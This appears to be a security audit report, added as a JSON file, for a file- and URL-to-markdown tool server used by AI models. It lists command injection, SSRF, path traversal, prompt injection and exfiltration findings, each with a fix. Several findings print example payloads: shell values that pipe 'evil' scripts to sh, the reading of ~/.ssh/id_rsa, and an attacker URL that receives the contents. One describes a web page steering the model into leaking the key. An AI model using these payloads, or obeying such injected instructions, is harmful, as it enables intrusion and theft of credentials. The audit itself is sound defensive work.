@@ -1,0 +1,161 @@
+[
+ {
+  "rule": "CMD-INJECTION",
+  "title": "filepath tool argument pasted into a shell command",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/server.ts",
+    "line": 70,
+    "quote": "filePath: validatedArgs.filepath,"
+   },
+   {
+    "file": "src/Markdownify.ts",
+    "line": 32,
+    "quote": "`${uvPath} run ${markitdownPath} \"${filePath}\"`,"
+   }
+  ],
+  "reason": "filepath from any *-to-markdown tool is placed inside double quotes in a string run by child_process.exec (a shell); a value like `x\"; curl evil.sh | sh; \"` or `$(id)` runs arbitrary commands.",
+  "fix": "Use execFile(uvPath, ['run', markitdownPath, '--', filePath]) with no shell, and resolve filePath and check it is inside an allowed directory.",
+  "id": "M001",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "CMD-INJECTION",
+  "title": "Hidden uvPath/projectRoot arguments choose the executable that is run",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/server.ts",
+    "line": 15,
+    "quote": "uvPath: z.string().optional(),"
+   },
+   {
+    "file": "src/server.ts",
+    "line": 56,
+    "quote": "uvPath: validatedArgs.uvPath || process.env.UV_PATH,"
+   },
+   {
+    "file": "src/Markdownify.ts",
+    "line": 32,
+    "quote": "`${uvPath} run ${markitdownPath} \"${filePath}\"`,"
+   }
+  ],
+  "reason": "Every conversion tool accepts undeclared uvPath and projectRoot arguments from the caller and uses uvPath as the start of the shell command, so a call with uvPath `sh -c 'curl evil|sh' #` (or any program) runs it; the input schema does not list these fields but the zod schema accepts them.",
+  "fix": "Remove uvPath and projectRoot from RequestPayloadSchema; take them only from operator config (env), and use execFile without a shell.",
+  "id": "M002",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "SSRF",
+  "title": "URL tools fetch any URL and return the body",
+  "verdict": "confirmed",
+  "severity": "high",
+  "evidence": [
+   {
+    "file": "src/server.ts",
+    "line": 54,
+    "quote": "url: validatedArgs.url,"
+   },
+   {
+    "file": "src/Markdownify.ts",
+    "line": 67,
+    "quote": "const response = await fetch(url);"
+   }
+  ],
+  "reason": "youtube/bing/webpage-to-markdown fetch whatever URL the model gives with no scheme/host check, so http://169.254.169.254/... or http://localhost:port/admin is fetched and the converted body is returned to the model.",
+  "fix": "Allow only https, resolve the host and block private/loopback/link-local/IPv6-local addresses, re-check on redirects (redirect: 'manual'), and restrict the YouTube/Bing tools to their own hosts.",
+  "id": "M003",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "title": "get-markdown-file and the file tools read any file on disk",
+  "verdict": "confirmed",
+  "severity": "high",
+  "evidence": [
+   {
+    "file": "src/server.ts",
+    "line": 81,
+    "quote": "filePath: validatedArgs.filepath,"
+   },
+   {
+    "file": "src/Markdownify.ts",
+    "line": 103,
+    "quote": "const text = await fs.promises.readFile(filePath, \"utf-8\");"
+   }
+  ],
+  "reason": "filepath is used as-is with no root or containment check, so get-markdown-file with ~/.ssh/id_rsa, ~/.aws/credentials or .env returns the secret to the model (the conversion tools likewise pass any path to markitdown).",
+  "fix": "Resolve the path with fs.realpath and require path.relative(allowedRoot, real) not to start with '..' (allowedRoot = the server's temp output dir for get-markdown-file and a configured input dir for the converters).",
+  "id": "M004",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "INDIRECT-INJECTION",
+  "title": "Fetched web pages and documents are returned raw into the model context",
+  "verdict": "confirmed",
+  "severity": "medium",
+  "evidence": [
+   {
+    "file": "src/Markdownify.ts",
+    "line": 67,
+    "quote": "const response = await fetch(url);"
+   },
+   {
+    "file": "src/server.ts",
+    "line": 93,
+    "quote": "{ type: \"text\", text: result.text },"
+   }
+  ],
+  "reason": "Text from any web page, search result, video transcript or document goes straight to the model unmarked; instructions hidden there can steer the model into the file-read and command-injection tools above.",
+  "fix": "Wrap returned content in clearly delimited untrusted-data markers and tell the client it is untrusted; fixing M001-M004 limits what injected text can trigger.",
+  "id": "M005",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "TOXIC-FLOW",
+  "title": "One server combines untrusted web input, local file read and an outbound fetch",
+  "verdict": "confirmed",
+  "severity": "high",
+  "evidence": [
+   {
+    "file": "src/Markdownify.ts",
+    "line": 103,
+    "quote": "const text = await fs.promises.readFile(filePath, \"utf-8\");"
+   },
+   {
+    "file": "src/Markdownify.ts",
+    "line": 67,
+    "quote": "const response = await fetch(url);"
+   }
+  ],
+  "reason": "A page fetched by webpage-to-markdown can tell the model to read ~/.ssh/id_rsa with get-markdown-file and then call webpage-to-markdown with https://attacker/?d=<contents>, exfiltrating it with no approval step.",
+  "fix": "Restrict file reads to a sandbox directory, restrict fetch hosts, and require user approval for file-read tools in the client.",
+  "id": "M006",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "UNPINNED-PACKAGE",
+  "title": "npm preinstall pipes a remote installer into sh",
+  "verdict": "confirmed",
+  "severity": "low",
+  "evidence": [
+   {
+    "file": "package.json",
+    "line": 20,
+    "quote": "\"preinstall\": \"./setup.sh\","
+   },
+   {
+    "file": "setup.sh",
+    "line": 5,
+    "quote": "curl -LsSf https://astral.sh/uv/install.sh | sh"
+   }
+  ],
+  "reason": "Installing the package runs an unpinned remote script with the installer's privileges; a compromise of that URL compromises every install.",
+  "fix": "Document uv as a prerequisite instead of installing it in preinstall, or pin a specific uv version and verify its checksum.",
+  "id": "M007",
+  "quotes_verified": 2
+ }
+]
